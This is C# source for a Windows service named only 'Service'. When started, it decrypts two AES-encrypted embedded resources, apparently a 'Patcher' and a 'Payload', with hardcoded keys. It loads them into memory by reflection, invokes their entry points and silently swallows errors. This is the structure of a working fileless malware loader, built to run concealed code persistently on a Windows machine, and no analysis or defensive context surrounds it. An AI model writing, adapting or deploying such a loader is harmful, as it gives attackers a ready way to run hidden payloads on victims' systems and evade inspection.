using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Threading;

namespace Service
{
    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }





        protected override void OnStart(string[] args)
        {
            Thread t = new Thread(new ThreadStart(Exec));
            t.Start();

        }

        public static void Exec()
        {
            //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { "OnStart" });
            try
            {

                var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
                Execute(asm);
                asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
                Execute(asm);
            }
            catch (Exception ex)
            {
                //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString()});
            }

            Thread.Sleep(1000);
            Environment.Exit(0);
        }

        private static byte[] Decrypt(string b64, string secretKey)
        {
            var src = Convert.FromBase64String(b64);
            var bytes = Encoding.UTF8.GetBytes(secretKey);

            byte[] key = bytes.Take(32).ToArray();
            byte[] iv = bytes.Take(16).ToArray();

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Key = key;
            rijndael.IV = iv;
            rijndael.Padding = PaddingMode.PKCS7;

            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
            return decryptedBytes;
        }

        private static void Execute(byte[] assemblyBytes)
        {
            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
            var type = assembly.GetType("EntryPoint.Entry");
            var method = type.GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            method.Invoke(null, new object[] { });
        }

        protected override void OnStop()
        {
            Environment.Exit(0);
        }
    }
}
